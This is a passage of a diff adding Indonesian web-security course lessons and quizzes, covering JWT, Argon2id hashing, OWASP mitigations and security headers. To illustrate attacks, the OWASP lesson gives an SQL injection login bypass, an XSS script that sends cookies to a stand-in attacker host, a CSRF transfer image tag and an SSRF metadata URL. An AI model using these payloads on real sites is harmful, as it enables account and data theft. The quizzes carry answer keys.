(**`Header.Payload.Signature`**):\n\n```text\neyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiJ1c3JfMTAxIiwicm9sZSI6IkFETUlOIn0.5Z_bXp9...\n[ HEADER (Algoritma) ] . [ PAYLOAD (Data Klaim) ] . [ SIGNATURE (Tanda Tangan Kriptografi) ]\n```\n\n> **Peringatan Keamanan Kritis**: Payload JWT **TIDAK DIENKRIPSI**, melainkan hanya di-encode Base64 biasa! Siapapun bisa membaca isi data di dalam payload. **JANGAN PERNAH menaruh password atau nomor kartu kredit di dalam JWT!**\n\n## 3. Pola Standar Industri: Access Token + Refresh Token\nUntuk mengatasi masalah pencabutan JWT:\n1. **Access Token (Masa Hidup Pendek: 10–15 Menit)**: Digunakan untuk otorisasi API request cepat tanpa membebani database.\n2. **Refresh Token (Masa Hidup Panjang: 7 Hari)**: Disimpan di database dan dikirim via **HttpOnly Cookie**. Saat Access Token kadaluarsa, Refresh Token digunakan untuk meminta Access Token baru.\n3. **Pencabutan (*Revocation*)**: Jika akun dicurigai dibajak, admin cukup menghapus Refresh Token di database!\n\n## Kesalahan Umum Pemula\n- **Menyimpan JWT di localStorage**: Sangat berbahaya! Skrip iklan atau library pihak ketiga yang terinfeksi XSS dapat membaca `localStorage.getItem('token')` dan mencuri akun pengguna seketika. Selalu simpan token di **HttpOnly Cookie**!\n\n## Praktik Mandiri\n1. Buka [jwt.io](https://jwt.io) dan amati bagaimana payload JWT dapat didekodekan secara terbuka tanpa password.\n\n## Ringkasan\n- **Session-Based Auth** memberikan kontrol pencabutan sesi instan dan sangat ideal untuk aplikasi web.\n- **JWT** bersifat stateless dan mandiri, namun sulit dicabut sebelum masa kedaluwarsanya habis.\n- Selalu gabungkan **Access Token (15 menit)** dan **Refresh Token (7 hari)**.\n- Selalu simpan kredensial sesi di dalam **HttpOnly, Secure, SameSite Cookie**.",
+        "quizzes": [
+          {
+            "id": "q-19-1-1",
+            "question": "Mengapa menyimpan token otentikasi di dalam HttpOnly Cookie jauh lebih aman dibandingkan menyimpannya di browser localStorage?",
+            "options": [
+              "HttpOnly Cookie tidak dapat dibaca atau diakses oleh skrip JavaScript di browser, sehingga kebal dari pencurian token melalui serangan Cross-Site Scripting (XSS).",
+              "HttpOnly Cookie otomatis mempercepat kecepatan internet.",
+              "localStorage hanya bisa menampung 5 karakter.",
+              "HttpOnly Cookie tidak memerlukan server backend."
+            ],
+            "correctIndex": 0,
+            "explanation": "Flag HttpOnly memblokir akses document.cookie dari runtime JavaScript, melindungi token dari serangan injeksi skrip XSS."
+          },
+          {
+            "id": "q-19-1-2",
+            "question": "Apa fakta keamanan penting yang wajib dipahami tentang bagian Payload di dalam sebuah JSON Web Token (JWT)?",
+            "options": [
+              "Payload JWT hanya di-encode dalam format teks Base64 (BUKAN dienkripsi), sehingga isinya dapat dibaca secara terbuka oleh siapa saja dan DILARANG menyimpan data sensitif seperti password.",
+              "Payload JWT terenkripsi dengan standar militer yang tidak bisa dibaca siapa pun.",
+              "Payload JWT otomatis menghapus database server.",
+              "Payload JWT hanya bisa dibaca oleh robot Google."
+            ],
+            "correctIndex": 0,
+            "explanation": "JWT hanya menjamin integritas keaslian data melalui Signature, bukan kerahasiaan isi data; payload dapat di-decode secara bebas oleh publik."
+          },
+          {
+            "id": "q-19-1-3",
+            "question": "Apa keuntungan utama menerapkan arsitektur pasangan Access Token (umur pendek 15 menit) dan Refresh Token (umur panjang di database)?",
+            "options": [
+              "Memberikan kecepatan otentikasi stateless tanpa beban database di setiap request, namun tetap mempertahankan kemampuan mencabut (revoke) sesi akun pengguna jika terindikasi dibajak.",
+              "Membuat ukuran file database menjadi 0 KB.",
+              "Menghilangkan kebutuhan password login.",
+              "Mempercepat waktu rendering animasi CSS."
+            ],
+            "correctIndex": 0,
+            "explanation": "Kombinasi ini menyeimbangkan performa stateless (access token) dengan kendali keamanan pencabutan sesi terpusat (refresh token)."
+          }
+        ]
+      },
+      {
+        "id": "lesson-19-2",
+        "stageId": "stage-19",
+        "slug": "password-hashing-dan-salting-argon2-bcrypt",
+        "title": "Password Hashing, Salting & Proteksi Kredensial (Argon2 / bcrypt)",
+        "titleEn": "Password Hashing & Salting (Argon2/bcrypt)",
+        "level": "INTERMEDIATE",
+        "estimatedMinutes": 20,
+        "description": "Memahami mengapa hashing satu arah (One-Way Hash) wajib untuk password, bahaya algoritma MD5/SHA256, peran Cryptographic Salt, dan implementasi modern dengan Argon2id / bcrypt.",
+        "prerequisites": [
+          "arsitektur-otentikasi-session-vs-jwt"
+        ],
+        "learningObjectives": [
+          "Membedakan fungsi Kriptografi Satu Arah (One-Way Hashing) vs Enkripsi Dua Arah (Two-Way Encryption).",
+          "Menjelaskan bahaya algoritma hash cepat (MD5/SHA256) terhadap serangan Rainbow Table dan GPU cracking.",
+          "Menerapkan fungsi Salt acak untuk mencegah kamus hash yang sama.",
+          "Mengimplementasikan hashing dan verifikasi password menggunakan Argon2id atau bcrypt."
+        ],
+        "whyMatters": "Menyimpan password dalam bentuk teks biasa (plaintext) adalah pelanggaran hukum dan etika terberat dalam rekayasa perangkat lunak.",
+        "careerContext": "Standar industri OWASP dan pemenang kompetisi password hashing internasional secara resmi merekomendasikan Argon2id.",
+        "commonMistakes": [
+          "Menggunakan `SHA-256` untuk password (SHA-256 dirancang sangat cepat untuk integritas file, sehingga peretas dapat mencoba 10 miliar tebakan per detik dengan GPU).",
+          "Menulis algoritma kriptografi kustom buatan sendiri alih-alih menggunakan library standar teruji."
+        ],
+        "keyTerms": [
+          {
+            "term": "One-Way Hash Function",
+            "definition": "Fungsi matematika satu arah yang mengubah input teks menjadi string acak berukuran tetap yang mustahil dikembalikan ke teks aslinya."
+          },
+          {
+            "term": "Salt",
+            "definition": "String acak unik yang digabungkan ke password sebelum di-hash untuk menggagalkan serangan Rainbow Table."
+          },
+          {
+            "term": "Argon2id",
+            "definition": "Standar algoritma hashing password nomor satu dunia yang tahan terhadap serangan GPU, ASIC, dan side-channel attacks."
+          }
+        ],
+        "contentMd": "# Password Hashing, Salting & Proteksi Kredensial (Argon2 / bcrypt)\n\n## Apa yang Akan Dipelajari?\nPada materi ini, Anda akan mempelajari standar keamanan penyimpanan kredensial: perbedaan **Hashing vs Enkripsi**, mengapa algoritma cepat seperti **MD5/SHA256 sangat berbahaya untuk password**, peran **Salt Kriptografis**, serta implementasi standar industri dengan **`Argon2id`** dan **`bcrypt`**.\n\n## Mengapa Konsep Ini Penting?\nJika database Anda suatu saat mengalami kebocoran (*data breach*), password pengguna **TIDAK BOLEH terbaca**. Dengan hashing yang tepat, bahkan developer atau admin database sendiri pun tidak bisa mengetahui password asli pengguna.\n\n## 1. Hashing vs Enkripsi\n\n| Kriteria | Enkripsi (Two-Way / Dua Arah) | Hashing (One-Way / Satu Arah) |\n| :--- | :--- | :--- |\n| **Sifat Alur** | Bisa dikembalikan (*Decrypted*) jika punya Kunci | **MUSTAHIL dikembalikan ke teks aslinya** |\n| **Tujuan** | Kerahasiaan data (Pesan Chat, Kartu Kredit) | **Verifikasi Integritas & Kredensial Password** |\n| **Cara Verifikasi**| Dekripsi lalu cocokkan | Hash input baru lalu bandingkan hasil hash-nya |\n\n## 2. Mengapa SHA-256 & MD5 DILARANG untuk Password?\n- **Algoritma Cepat (Fast Hashes - MD5, SHA-1, SHA-256)** dirancang untuk memeriksa integritas unduhan file. Kartu grafis (GPU) modern dapat menghitung **10 Miliar tebakan SHA-256 per detik**, sehingga password 8 karakter dapat dibobol dalam hitungan menit!\n- **Algoritma Lambat Terkalibrasi (Slow Hashes - Argon2id, bcrypt)** sengaja membutuhkan waktu komputasi (~300ms) dan memori RAM yang besar, membuat serangan brute-force GPU menjadi mustahil secara ekonomis.\n\n## 3. Peran Kriptografis Salt\nJika dua pengguna sama-sama menggunakan password `rahasia123`:\n- **Tanpa Salt**: Hasil hash kedua user akan kembar sama persis $\\rightarrow$ Peretas cukup mencocokkan dengan kamus hash publik (*Rainbow Table*).\n- **Dengan Salt**: Setiap user diberikan string acak unik 16 byte (Salt) sebelum di-hash $\\rightarrow$ Hasil hash kedua user **100% BERBEDA TOTAL**.\n\n## 4. Implementasi Standar Industri dengan Argon2id / bcrypt\n\n```typescript\n// File: src/lib/password.ts\nimport argon2 from \"argon2\"; // Standar OWASP Rekomendasi Nomor 1\n\n// 1. Hashing saat Pendaftaran Akun (Register):\nexport async function hashPassword(passwordPlain: string): Promise<string> {\n  return await argon2.hash(passwordPlain, {\n    type: argon2.argon2id, // Varian hybrid paling aman\n    memoryCost: 2 ** 16,    // Alokasi memori RAM 64 MB (Tahan Serangan GPU)\n    timeCost: 3,           // 3 Iterasi waktu\n  });\n}\n\n// 2. Verifikasi saat Login:\nexport async function verifyPassword(passwordHash: string, passwordInput: string): Promise<boolean> {\n  try {\n    // argon2 otomatis mengekstrak salt internal dan memverifikasi kecocokan:\n    return await argon2.verify(passwordHash, passwordInput);\n  } catch (error) {\n    return false;\n  }\n}\n```\n\n## Kesalahan Umum Pemula\n- **Mencoba mendekripsi password**: Bertanya *\"Bagaimana cara mendekripsi hash password user yang lupa?\"*. Password hash tidak bisa didekripsi; solusi untuk user yang lupa adalah mengirimkan link **Reset Password Baru**.\n\n## Praktik Mandiri\n1. Buat script pengujian hash password `admin123` dengan Argon2id.\n2. Uji `verifyPassword` dengan password yang benar dan password yang salah.\n\n## Ringkasan\n- Password **WAJIB di-hash satu arah** (One-Way Hashing), tidak boleh plaintext atau dienkripsi biasa.\n- Dilarang keras menggunakan MD5 atau SHA-256 untuk password.\n- Gunakan standar industri resmi: **Argon2id** atau **bcrypt**.\n- **Salt** memastikan dua password yang sama menghasilkan hash yang unik berbeda.",
+        "quizzes": [
+          {
+            "id": "q-19-2-1",
+            "question": "Mengapa algoritma cryptographic hash cepat seperti MD5 atau SHA-256 secara ketat DILARANG digunakan untuk menyimpan password pengguna?",
+            "options": [
+              "Karena dirancang sangat cepat untuk integritas file, sehingga peretas dapat menggunakan kartu grafis (GPU) modern untuk mencoba miliaran tebakan per detik (Brute-Force & Rainbow Table) dalam waktu sangat singkat.",
+              "Karena SHA-256 tidak didukung oleh browser.",
+              "Karena MD5 hanya bisa digunakan pada hari libur.",
+              "Karena SHA-256 memakan kuota internet pengguna."
+            ],
+            "correctIndex": 0,
+            "explanation": "Password hashing membutuhkan algoritma komputasi terkalibrasi yang sengaja memakan resource CPU/Memory (seperti Argon2id/bcrypt) untuk mencegah serangan akselerasi GPU."
+          },
+          {
+            "id": "q-19-2-2",
+            "question": "Apa fungsi dari 'Salt' (string acak unik) yang digabungkan ke dalam password sebelum proses hashing dilakukan?",
+            "options": [
+              "Memastikan bahwa dua pengguna yang memiliki password yang sama persis akan menghasilkan nilai hash yang berbeda total, menggagalkan serangan pencocokan kamus Rainbow Table.",
+              "Mengubah password menjadi file gambar.",
+              "Mengirimkan password ke email admin.",
+              "Memperkecil ukuran password di database."
+            ],
+            "correctIndex": 0,
+            "explanation": "Cryptographic Salt menambahkan entropi acak unik per-pengguna sehingga serangan pre-computed dictionary tables menjadi tidak efektif."
+          },
+          {
+            "id": "q-19-2-3",
+            "question": "Algoritma password hashing manakah yang merupakan pemenang kompetisi password hashing internasional resmi dan direkomendasikan nomor satu oleh standar keamanan OWASP?",
+            "options": [
+              "Argon2id",
+              "Base64",
+              "MD5-Crypt",
+              "AES-256"
+            ],
+            "correctIndex": 0,
+            "explanation": "Argon2 (khususnya varian Argon2id) adalah standar algoritma hashing password paling tangguh saat ini yang kebal terhadap ASIC dan GPU attacks."
+          }
+        ]
+      },
+      {
+        "id": "lesson-19-3",
+        "stageId": "stage-19",
+        "slug": "owasp-top-10-web-vulnerabilities",
+        "title": "Mitigasi Kerentanan OWASP Top 10 (SQLi, XSS, CSRF, SSRF)",
+        "titleEn": "OWASP Top 10 Web Vulnerability Mitigation",
+        "level": "INTERMEDIATE",
+        "estimatedMinutes": 20,
+        "description": "Membedah 4 kerentanan web paling berbahaya dan cara mitigasinya: SQL Injection (Parameterized Queries), XSS (Sanitasi HTML), CSRF (SameSite cookies & CSRF tokens), dan SSRF (URL whitelisting).",
+        "prerequisites": [
+          "password-hashing-dan-salting-argon2-bcrypt"
+        ],
+        "learningObjectives": [
+          "Mendiagnosis mekanisme serangan SQL Injection dan mitigasinya menggunakan Parameterized Queries (Prisma ORM).",
+          "Mencegah Cross-Site Scripting (XSS) Stored & Reflected dengan DOMPurify dan textContent.",
+          "Mencegah Cross-Site Request Forgery (CSRF) menggunakan Cookie SameSite=Lax/Strict dan Anti-CSRF Tokens.",
+          "Mencegah Server-Side Request Forgery (SSRF) dengan memvalidasi skema protokol dan memblokir IP privat internal (127.0.0.1, 169.254.169.254)."
+        ],
+        "whyMatters": "Memahami OWASP Top 10 adalah garis pertahanan wajib untuk melindungi data pribadi pengguna dari tuntutan hukum dan kerugian finansial akibat peretasan.",
+        "careerContext": "Security Awareness OWASP adalah kriteria evaluasi utama dalam penilaian arsitektur teknis perusahaan terkemuka.",
+        "commonMistakes": [
+          "Menggabungkan string manual ke dalam query database (`'SELECT * FROM users WHERE email = ' + input`) yang membuka celah fatal SQL Injection.",
+          "Merender input pengguna ke dalam `dangerouslySetInnerHTML` di React tanpa sanitasi `DOMPurify`."
+        ],
+        "keyTerms": [
+          {
+            "term": "OWASP",
+            "definition": "Open Web Application Security Project: yayasan nirlaba global standar keamanan perangkat lunak."
+          },
+          {
+            "term": "SQL Injection (SQLi)",
+            "definition": "Injeksi perintah SQL jahat ke dalam input form untuk memanipulasi atau mencuri database server."
+          },
+          {
+            "term": "Cross-Site Scripting (XSS)",
+            "definition": "Penyisipan skrip JavaScript jahat yang dieksekusi di browser pengguna lain untuk mencuri data sesi."
+          },
+          {
+            "term": "CSRF",
+            "definition": "Serangan yang memperdaya browser pengguna yang sudah terotentikasi untuk mengirimkan request transaksi ilegal ke situs target."
+          }
+        ],
+        "contentMd": "# Mitigasi Kerentanan OWASP Top 10 (SQLi, XSS, CSRF, SSRF)\n\n## Apa yang Akan Dipelajari?\nPada materi ini, Anda akan mempelajari 4 kerentanan paling mematikan dalam daftar **OWASP Top 10**: **SQL Injection (SQLi)**, **Cross-Site Scripting (XSS)**, **Cross-Site Request Forgery (CSRF)**, dan **Server-Side Request Forgery (SSRF)** beserta teknik mitigasi praktisnya.\n\n## Mengapa Konsep Ini Penting?\nSatu celah keamanan kecil dapat menghancurkan reputasi bisnis dalam semalam. Menulis kode yang berfungsi saja tidak cukup; kode Anda harus **Tahan Banting (*Secure by Design*)**.\n\n## 1. SQL Injection (SQLi) & Parameterized Queries\n- **Bahaya Serangan**: Peretas mengetikkan `' OR '1'='1` di kotak login sehingga query SQL berubah menjadi:\n  `SELECT * FROM users WHERE email = '' OR '1'='1'` $\\rightarrow$ Peretas berhasil login sebagai admin tanpa password!\n- **Mitigasi Mutlak**: **JANGAN PERNAH sambung string SQL manual!** Selalu gunakan ORM modern seperti **Prisma** atau **Parameterized Queries** yang memperlakukan input murni sebagai data, bukan perintah:\n\n```typescript\n// AMAN 100%: Prisma otomatis menggunakan Parameterized Queries di balik layar!\nconst user = await db.user.findFirst({\n  where: { email: inputUser }\n});\n```\n\n## 2. Cross-Site Scripting (XSS)\n- **Bahaya Serangan**: Peretas memasukkan teks komentar: `<script>fetch('https://hacker.com?stolen=' + document.cookie)</script>`. Saat user lain membuka artikel, cookie sesi mereka terkirim ke server peretas.\n- **Mitigasi**:\n  1. React secara default **otomatis me-escape seluruh teks** di dalam kurung kurawal `{komentar}`.\n  2. Jika WAJIB merender HTML kaya (Rich Text Editor), gunakan library sanitasi **`isomorphic-dompurify`**:\n\n```tsx\nimport DOMPurify from \"isomorphic-dompurify\";\n\n// Bersihkan tag script berbahaya sebelum di-render:\nconst htmlBersih = DOMPurify.sanitize(inputArtikelMentah);\n\n<div dangerouslySetInnerHTML={{ __html: htmlBersih }} />\n```\n\n## 3. Cross-Site Request Forgery (CSRF)\n- **Bahaya Serangan**: Korban sedang login di bank.com. Korban membuka situs jebakan peretas yang memuat gambar `<img src=\"https://bank.com/api/transfer?to=hacker&amount=1000000\">`. Browser otomatis menyertakan cookie bank korban dan mentransfer uang tanpa disadari!\n- **Mitigasi**:\n  1. Pasang atribut **`SameSite=Lax`** atau **`SameSite=Strict`** pada seluruh Cookie otentikasi.\n  2. Server Actions di Next.js secara otomatis memvalidasi header `Origin` untuk proteksi anti-CSRF bawaan.\n\n## 4. Server-Side Request Forgery (SSRF)\n- **Bahaya Serangan**: Fitur \"Unduh Gambar dari URL\" dieksploitasi peretas dengan memasukkan URL internal cloud: `http://169.254.169.254/latest/meta-data/` untuk mencuri AWS Access Keys server backend!\n- **Mitigasi**: Validasi protokol (hanya izinkan `http/https`) dan **blokir seluruh Private IP (Localhost 127.0.0.1, 192.168.x.x, 169.254.x.x)**.\n\n## Kesalahan Umum Pemula\n- **Memakai dangerouslySetInnerHTML tanpa sanitasi**: Merender HTML dari database tanpa melewati filter `DOMPurify`.\n\n## Praktik Mandiri\n1. Uji skrip `DOMPurify.sanitize('<img src=x onerror=alert(1)>')` dan amati bagaimana atribut jahat `onerror` dibuang secara otomatis.\n\n## Ringkasan\n- Cegah **SQLi** dengan Parameterized Queries (Prisma ORM).\n- Cegah **XSS** dengan sanitasi **DOMPurify** dan hindari penyimpanan kredensial di `localStorage`.\n- Cegah **CSRF** dengan Cookie **`SameSite=Lax/Strict`** dan validasi header Origin.\n- Cegah **SSRF** dengan memblokir request backend ke IP privat lokal.",
+        "quizzes": [
+          {
+            "id": "q-19-3-1",
+            "question": "Bagaimana cara paling efektif dan standar untuk mencegah celah keamanan SQL Injection (SQLi) pada aplikasi backend?",
+            "options": [
+              "Menggunakan Parameterized Queries / Prepared Statements (atau memanfaatkan ORM modern seperti Prisma) yang memisahkan kode SQL dari input data pengguna secara mutlak.",
+              "Menghapus seluruh database SQL dan menggantinya dengan file teks.",
+              "Mengubah font teks database menjadi Comic Sans.",
+              "Memblokir semua pengguna yang menggunakan huruf vokal."
+            ],
+            "correctIndex": 0,
+            "explanation": "Parameterized queries memperlakukan input pengguna murni sebagai nilai parameter data literal, sehingga karakter injeksi SQL tidak dapat dieksekusi sebagai perintah."
+          },
+          {
+            "id": "q-19-3-2",
+            "question": "Ketika Anda terpaksa harus merender konten HTML kaya (Rich Text Markdown/WYSIWYG) ke dalam React menggunakan dangerouslySetInnerHTML, tindakan apakah yang WAJIB dilakukan untuk mencegah serangan Cross-Site Scripting (XSS)?",
+            "options": [
+              "Menyaring dan membersihkan string HTML tersebut menggunakan library sanitasi teruji seperti DOMPurify sebelum di-render ke DOM.",
+              "Mengubah format teks menjadi huruf kapital.",
+              "Menyimpan HTML di localStorage.",
+              "Mematikan JavaScript di komputer pengguna."
+            ],
+            "correctIndex": 0,
+            "explanation": "DOMPurify membersihkan markup berbahaya (seperti tag <script>, atribut onload/onerror, atau javascript: URIs) sambil mempertahankan format styling yang aman."
+          },
+          {
+            "id": "q-19-3-3",
+            "question": "Atribut Cookie apakah yang menjadi dinding pertahanan utama peramban modern untuk mencegah serangan Cross-Site Request Forgery (CSRF)?",
+            "options": [
+              "SameSite=Lax (atau SameSite=Strict)",
+              "CookieType=Safe",
+              "NoCSRF=True",
+              "AntiHack=Enabled"
+            ],
+            "correctIndex": 0,
+            "explanation": "Atribut SameSite melarang browser melampirkan cookie otentikasi saat permintaan dipicu dari situs domain luar pihak ketiga (cross-site context)."
+          }
+        ]
+      },
+      {
+        "id": "lesson-19-4",
+        "stageId": "stage-19",
+        "slug": "http-security-headers-dan-csp",
+        "title": "HTTP Security Headers & Content Security Policy (CSP)",
+        "titleEn": "Security Headers & Content Security Policy",
+        "level": "ADVANCED",
+        "estimatedMinutes": 20,
+        "description": "Memperkuat pertahanan browser dengan HTTP Security Headers: Content-Security-Policy (CSP nonces), Strict-Transport-Security (HSTS), X-Frame-Options (Anti-Clickjacking), dan X-Content-Type-Options.",
+        "prerequisites": [
+          "owasp-top-10-web-vulnerabilities"
+        ],
+        "learningObjectives": [
+          "Menerapkan HTTP Security Headers penting di konfigurasi Next.js (next.config.js / middleware).",
+          "Menyusun aturan Content Security Policy (CSP) ketat dengan Nonce untuk membatasi asal muasal eksekusi skrip, font, dan gambar.",
+          "Mencegah serangan Clickjacking menggunakan header `X-Frame-Options: DENY` atau `frame-ancestors 'none'`.",
+          "Memaksa koneksi enkripsi HTTPS permanen dengan `Strict-Transport-Security` (HSTS)."
+        ],
+        "whyMatters": "Security Headers adalah instruksi browser tingkat protokol yang menggagalkan upaya pembajakan halaman, framing iframe ilegal, dan injeksi skrip eksternal.",
+        "careerContext": "Website enterprise dan perbankan wajib mendapatkan nilai A+ pada audit pengujian [securityheaders.com](https://securityheaders.com).",
+        "commonMistakes": [
+          "Menyetel CSP `script-src 'unsafe-inline'` yang mematikan seluruh proteksi CSP terhadap XSS.",
+          "Lupa menyetel header `X-Frame-Options` sehingga website dapat disisipkan ke dalam iframe transparan untuk mencuri klik pengguna (*Clickjacking*)."
+        ],
+        "keyTerms": [
+          {
+            "term": "Content Security Policy (CSP)",
+            "definition": "Header keamanan HTTP yang membatasi domain sumber daya mana saja (skrip, gaya, gambar) yang diizinkan untuk dimuat dan dieksekusi oleh browser."
+          },
+          {
+            "term": "Clickjacking",
+            "definition": "Serangan penipuan visual dengan memuat situs korban di dalam iframe transparan di atas tombol permainan untuk mencuri klik otorisasi user."
+          },
+          {
+            "term": "HSTS (Strict-Transport-Security)",
+            "definition": "Header yang memaksa browser hanya berkomunikasi melalui protokol aman HTTPS terenkripsi."
+          }
+        ],
+        "contentMd": "# HTTP Security Headers & Content Security Policy (CSP)\n\n## Apa yang Akan Dipelajari?\nPada materi tingkat lanjut ini, Anda akan mempelajari cara membentengi website menggunakan **HTTP Security Headers**: menyusun **Content Security Policy (CSP)** dengan Nonce, mencegah Clickjacking dengan **`X-Frame-Options`**, dan memaksa HTTPS dengan **`HSTS`**.\n\n## Mengapa Konsep Ini Penting?\nMeskipun kode aplikasi Anda bersih, browser pengguna tetap bisa diserang melalui jaringan tidak aman atau ekstensi browser jahat. HTTP Security Headers adalah sekumpulan instruksi militer dari server yang memberitahu browser: *\"Jangan izinkan website ini dimasukkan ke dalam iframe, jangan jalankan skrip dari luar, dan tolak koneksi HTTP tanpa enkripsi!\"*.\n\n## 1. Daftar Security Headers Wajib\n\n```text\n┌───────────────────────────────┬─────────────────────────────────────────────────────────────┐\n│ Header Keamanan HTTP          │ Fungsi Pertahanan                                           │\n├───────────────────────────────┼─────────────────────────────────────────────────────────────┤\n│ Content-Security-Policy (CSP) │ Mengunci whitelist domain skrip, font, gambar yang sah      │\n│ X-Frame-Options: DENY         │ Mencegah website dimasukkan ke iframe (Anti-Clickjacking)  │\n│ X-Content-Type-Options        │ Mencegah MIME-sniffing (Paksa baca tipe file yang benar)   │\n│ Strict-Transport-Security     │ HSTS: Wajibkan komunikasi via HTTPS terenkripsi            │\n│ Referrer-Policy               │ Batasi kebocoran URL path sensitif ke situs luar           │\n└───────────────────────────────┴─────────────────────────────────────────────────────────────┘\n```\n\n## 2. Mengonfigurasi Security Headers di `next.config.ts`\n\n```typescript\n// File: next.config.ts\nimport type { NextConfig } from \"next\";\n\nconst securityHeaders = [\n  // 1. Anti-Clickjacking: Larang website dimuat di dalam iframe situs lain\n  { key: \"X-Frame-Options\", value: \"DENY\" },\n  \n  // 2. Anti MIME-Sniffing: Cegah file gambar dieksekusi sebagai file executable\n  { key: \"X-Content-Type-Options\", value: \"nosniff\" },\n  \n  // 3. HSTS: Paksa HTTPS selama 2 tahun + sertakan subdomains\n  { key: \"Strict-Transport-Security\", value: \"max-age=63072000; includeSubDomains; preload\" },\n  \n  // 4. Referrer Policy: Hanya kirim origin domain saat berpindah ke situs lain\n  { key: \"Referrer-Policy\", value: \"strict-origin-when-cross-origin\" },\n  \n  // 5. Matikan akses sensor hardware yang tidak digunakan\n  { key: \"Permissions-Policy\", value: \"camera=(), microphone=(), geolocation=()\" },\n];\n\nconst nextConfig: NextConfig = {\n  async headers() {\n    return [\n      {\n        source: \"/:path*\", // Terapkan pada seluruh rute\n        headers: securityHeaders,\n      },\n    ];\n  },\n};\n\nexport default nextConfig;\n```\n\n## 3. Menyusun Content Security Policy (CSP)\nAturan CSP menentukan dari mana saja aset boleh diunduh:\n```text\nContent-Security-Policy: \n  default-src 'self'; \n  script-src 'self' https://apis.google.com; \n  style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; \n  img-src 'self' data: https://res.cloudinary.com; \n  frame-ancestors 'none';\n```\n\n- **`default-src 'self'`**: Hanya izinkan aset dari domain sendiri secara default.\n- **`script-src 'self' https://apis.google.com`**: Blokir seluruh skrip luar KECUALI domain sendiri dan Google APIs.\n- **`frame-ancestors 'none'`**: CSP modern standar untuk mematikan rendering iframe.\n\n## Kesalahan Umum Pemula\n- **Memakai `unsafe-eval` di CSP**: Mengizinkan eksekusi fungsi `eval()` yang sangat berbahaya bagi keamanan aplikasi.\n\n## Praktik Mandiri\n1. Buka situs [securityheaders.com](https://securityheaders.com) dan periksa nilai skor domain Anda.\n2. Pasang konfigurasi security headers di atas dan targetkan skor nilai **A+**.\n\n## Ringkasan\n- **Security Headers** melindungi browser klien pada tingkat protokol HTTP.\n- **`X-Frame-Options: DENY`** mematikan serangan Clickjacking.\n- **`Strict-Transport-Security` (HSTS)** menjamin enkripsi HTTPS permanen.\n- **Content Security Policy (CSP)** mengunci whitelist sumber daya yang diizinkan dimuat browser.",
+        "quizzes": [
+          {
+            "id": "q-19-4-1",
+            "question": "Header HTTP keamanan apakah yang digunakan untuk mencegah serangan 'Clickjacking' dengan melarang halaman website Anda dimuat di dalam tag <iframe> situs luar?",
+            "options": [
+              "X-Frame-Options: DENY (atau CSP frame-ancestors 'none')",
+              "X-Click-Protect: true",
+              "X-Allow-Iframe: false",
+              "X-No-Hacking: 1"
+            ],
+            "correctIndex": 0,
+            "explanation": "X-Frame-Options: DENY menginstruksikan browser untuk menolak rendering halaman jika disematkan di dalam frame/iframe situs lain."
+          },
+          {
+            "id": "q-19-4-2",
+            "question": "Apa fungsi utama dari Content Security Policy (CSP) yang dikirimkan oleh server backend?",
+            "options": [
+              "Mendefinisikan daftar whitelist domain dan sumber daya yang diizinkan untuk dimuat dan dieksekusi oleh browser (seperti skrip JS, stylesheet, dan gambar), membatasi injeksi aset liar dari peretas.",
+              "Mengatur harga langganan kursus secara otomatis.",
+              "Mengubah bahasa antarmuka menjadi bahasa Inggris.",
+              "Menghapus seluruh file cookie di komputer pengguna."
+            ],
+            "correctIndex": 0,
+            "explanation": "CSP bertindak sebagai firewall peramban yang membatasi asal muasal eksekusi skrip dan koneksi jaringan hanya ke domain yang diizinkan."
+          },
+          {
+            "id": "q-19-4-3",
+            "question": "Apa instruksi yang diberikan oleh header Strict-Transport-Security (HSTS) kepada browser pengguna?",
+            "options": [
+              "Memaksa browser untuk HANYA berkomunikasi dengan server melalui koneksi aman terenkripsi HTTPS dan otomatis menolak koneksi HTTP biasa tanpa enkripsi selama durasi waktu yang ditentukan.",
+              "Mematikan browser jika koneksi internet lambat.",
+              "Mewajibkan pengguna memasukkan password dua kali.",
+              "Menghapus histori pencarian browser."
+            ],
+            "correctIndex": 0,
+            "explanation": "HSTS melindungi pengguna dari serangan Man-in-the-Middle (SSL Strip) dengan memaksa navigasi HTTPS secara permanen."
+          }
+        ]
+      },
+      {
+        "id": "lesson-19-5",
+        "stageId": "stage-19",
+        "slug": "nextjs-middleware-auth-guard-dan-rbac",
+        "title": "Next.js Middleware: Auth Guard & Role-Based Access Control (RBAC)",
+        "titleEn": "Next.js Middleware & RBAC",
+        "level": "ADVANCED",
+        "estimatedMinutes": 20,
+        "description": "Mengamankan rute halaman secara terpusat dengan Next.js Middleware (middleware.ts), verifikasi session/token di Edge, redirect unauthorized users, dan Role-Based Access Control (Admin vs Student).",
+        "prerequisites": [
+          "http-security-headers-dan-csp"
+        ],
+        "learningObjectives": [
+          "Membangun Middleware global Next.js pada file `middleware.ts` di root proyek.",
+          "Menerapkan konfigurasi `matcher` untuk menyaring rute privat yang dilindungi (`/dashboard/:path*`, `/admin/:path*`).",
+          "Mengekstrak dan memverifikasi token sesi dari cookies di lingkungan Edge Runtime.",
+          "Menerapkan Role-Based Access Control (RBAC) untuk memblokir pengguna reguler dari rute khusus admin."
+        ],
+        "whyMatters": "Middleware memeriksa otentikasi sebelum halaman sempat di-render, memangkas waktu loading dan mencegah 'flicker' konten rahasia pada pengguna yang belum login.",
+        "careerContext": "Arsitektur proteksi rute terpusat dengan Middleware adalah pola standar seluruh aplikasi Next.js produksi.",
+        "commonMistakes": [
+          "Melakukan pemeriksaan auth secara manual di dalam setiap file `page.tsx` satu per satu (mudah lupa dan rawan celah; selalu gunakan Middleware terpusat!).",
+          "Memanggil library berat yang membutuhkan Node.js runtime penuh di dalam Middleware (Middleware berjalan di Edge Runtime yang ringan)."
+        ],
+        "keyTerms": [
+          {
+            "term": "Next.js Middleware",
+            "definition": "Kode yang dieksekusi di Edge sebelum sebuah request selesai diproses, memungkinkan manipulasi header, redirect, dan validasi sesi."
+          },
+          {
+            "term": "matcher",
+            "definition": "Konfigurasi regex/glob pada Middleware untuk menentukan rute URL mana saja yang wajib melewati pemeriksaan."
+          },
+          {
+            "term": "RBAC (Role-Based Access Control)",
+            "definition": "Model keamanan yang membatasi hak akses sistem berdasarkan peran/role akun pengguna (misal: ADMIN, INSTRUCTOR, STUDENT)."
+          }
+        ],
